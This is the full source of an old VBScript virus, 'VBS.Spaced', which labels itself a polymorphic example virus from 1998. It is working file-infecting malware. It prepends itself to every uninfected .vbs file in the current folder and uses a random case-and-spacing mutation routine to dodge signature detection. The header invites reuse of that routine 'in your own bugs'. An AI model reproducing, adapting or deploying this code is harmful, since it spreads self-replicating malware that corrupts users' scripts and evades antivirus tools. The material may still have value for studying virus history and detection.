'VBS.Spaced.vbs

'**********
' A Polymorphic Example VB Script Virus Based On VBSv777
' By SPo0Ky + CAD - 14. Nov. 1998 -
' Feel Free To Use The cbMUTATE Function In Your Own Bugs :-)

 Const cbForReading = 1 , cbForWriting = 2

 Randomize
 
 cbWePath = Wscript . ScriptFullName
 
 Set cbFSO = CreateObject ( "Scripting.FileSystemObject" )
 
 Set cbWeFile = cbFSO . OpenTextFile ( cbWePath , cbForReading )
 cbWeCode = cbWeFile . ReadAll
 cbWeFile . Close
 
 cbVirusSize = InStr ( 3 , cbWeCode , "*****" & "*****" ) + 10 + 1

 Set cbWeFile = cbFSO . OpenTextFile ( cbWePath , cbForReading )
 cbWeCode = cbWeFile . Read ( cbVirusSize )
 cbWeFile . Close
 
 For Each cbFile In cbFSO . GetFolder ( "." ) . Files
 
   If LCase ( cbFSO . GetExtensionName ( cbFile . Name ) ) = Chr ( 118 ) & Chr ( 98 ) & Chr ( 115 ) Then
 
     Set cbVictimFile = cbFSO . OpenTextFile ( cbFile . Path , cbForReading )
     cbInfectionMarker = cbVictimFile . Read ( 11 )
     cbVictimFile . Close
 
     If cbInfectionMarker <> "'*****" & "*****" Then

       Set cbVictimFile = cbFSO . OpenTextFile ( cbFile . Path , cbForReading )
       cbVictimCode = cbVictimFile . ReadAll
       cbVictimFile . Close
 
       cbVictimCode = cbMutate ( cbWeCode ) & cbVictimCode
 
       Set cbVictimFile = cbFSO . OpenTextFile ( cbFile . Path , cbForWriting , 1 )
       cbVictimFile . Write cbVictimCode
       cbVictimFile . Close
 
     End If
 
   End If
 
 Next
 
 
 Function cbMutate ( cbString )
 
   cbNewString = ""
   cbI = 1
 
   While cbI <= Len ( cbString )
 
     If Mid ( cbString , cbI , 1 ) = Chr ( 32 ) Then

       For cbJ = 1 to Int ( 5 * Rnd ) + 1

         cbNewString = cbNewString + Chr ( 32 )

       Next
 
         Do
 
           cbI = cbI + 1
 
         Loop While Mid ( cbString , cbI , 1 ) = Chr ( 32 )
 
     Else
 
       If Int ( 2 * Rnd ) + 1 = 1 Then

         cbNewString = cbNewString + UCase ( Mid ( cbString , cbI , 1 ) )

       Else

         cbNewString = cbNewString + LCase ( Mid ( cbString , cbI , 1 ) )

       End If

       cbI = cbI + 1
 
     End If
 
   Wend
 
   cbMutate = cbNewString
 
 End Function
 
 '**********

